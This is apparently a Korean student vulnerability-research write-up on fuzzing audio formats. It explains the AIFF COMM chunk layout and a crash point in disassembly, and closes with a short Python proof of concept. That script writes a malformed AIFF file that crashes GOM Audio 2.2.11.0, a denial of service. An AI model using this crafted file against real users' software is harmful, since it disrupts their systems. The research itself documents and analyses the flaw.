# 힘내라 청춘 - 첫 번째 프로젝트

## 오디오 파일 포맷 퍼징 중간 정리

현재 까지 퍼징 테스트가 진행된 오디오 파일 포맷은 AIFF, AU, OGG, MIDI이다. 이 중 out of bound memory access로 인한 denial of service 공격이 가능한 포인트를 발견하여 해당 포인트에 대한 분석을 진행 중이다. 

### AIFF의 COMM Chunk
AIFF 파일 포맷에서 COMM Chunk는 필수요소로 channel, frame의 수와 sample size, sample rate가 정의된다. memory corruption을 유발하는 요소는 sample size로 임의로 변조한 값을 삽입하여 crash 유도가 가능하다.

|offset|size|contents|
|---|---|---|
|0|4|ID|
|4|4|Chunk size|
|8|2|Number of channels|
|10|4|Number of frames|
|14|2|Sample size //1...32 |
|16|10|Sample Rate|

#### Sample size
각 Sample point의 bit 수로 1 부터 32까지 설정할 수 있다. 

#### Sample Point
각 Sample frame의 Sample point는 2의 보수 값이다. COMM chunk의 sample size에서 정즤한 대로 1 ~ 32의 비트 폭을 가지며 연속적인 바이트에 정수로 저장된다. 1 ~ 8 비트 폭의 sampe point는 1바이트에 저장, 9 ~ 16 비트 sample point는 2바이트에 저장, 17 ~ 24	 비트 sample point는 3바이트에 저장, 25 ~ 32 비트 sample point는 4바이트에 저장되며 sample point의 너비가 8 비트의 배수보다 작으면 sample point 데이터가 남게 된다. 예를 들어, 101000010111인 12 비트 sample point는 2바이트로 왼쪽 정렬되어 저장된다.

|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|
|-|-|-|-|-|-|-|-|-|--|--|--|--|--|--|--|
|1|0|1|0|0|0|0|1|0|1|1|1|0|0|0|0|
||||||||||||||||(4bit padding)|


### Crash point
`sub_7455EC39()` 함수에서 전달 받은 반환 값에 대한 검증 없이 해당 값을 이용하여 메모리 접근을 시도하기 때문에 접근할 수 없는 메모리 주소 값을 반환받은 경우 Exception이 발생된다.
```asm
185 0x7455f0c2L call    sub_7455EC39
186 0x7455f0c7L mov     ebx, eax
187 0x7455f0c9L mov     eax, [ebp+var_14]
188 0x7455f0ccL inc     eax
189 0x7455f0cdL mov     [ebp+var_10DC], ebx
190 0x7455f0d3L mov     [ebx+20h], eax
```
### POC
대상 프로그램 : 곰 오디오
버전 : V 2.2.11.0 (2017/10/30)

```python
#!/usr/bin/python
 
data = "\x46\x4F\x52\x4D\x00\x00\xB8\x0A\x41\x49\x46\x46\x43\x4F\x4D\x4D\x00\x00\x00\x12\x00\x02\x00\x00\x5B\xC5\x00\x49\x40\x0B\xFA\x00\x00\x00\x00\x00\x00\x00"
 
outfile = file("poc.aif", 'wb')
 
outfile.write(data)
 
outfile.close()
 
print "Created Poc"
```
